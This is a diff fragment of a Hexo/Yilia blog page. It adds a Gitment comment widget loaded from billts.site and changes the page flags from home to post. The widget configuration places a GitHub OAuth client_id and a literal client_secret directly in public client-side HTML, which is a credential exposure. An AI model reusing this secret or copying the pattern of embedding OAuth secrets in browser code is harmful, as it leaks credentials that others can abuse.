+  <div id="gitment-ctn"></div> 
+<link rel="stylesheet" href="https://billts.site/extra_css/gitment.css">
+<script src="https://billts.site/js/gitment.js"></script>
+<script>
+var gitment = new Gitment({
+  id: "http://yoursite.com/2020/02/07/level3/",
+  owner: 'SpHandsomeJack',
+  repo: 'gitment-comment',
+  oauth: {
+    client_id: 'e125cda2916a59dfd01a',
+    client_secret: 'aa58b71147342913b05045b2ec4e649b17024b31',
+  },
+})
+gitment.render('gitment-ctn')
+</script>
   
 
 
@@ -900,8 +440,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
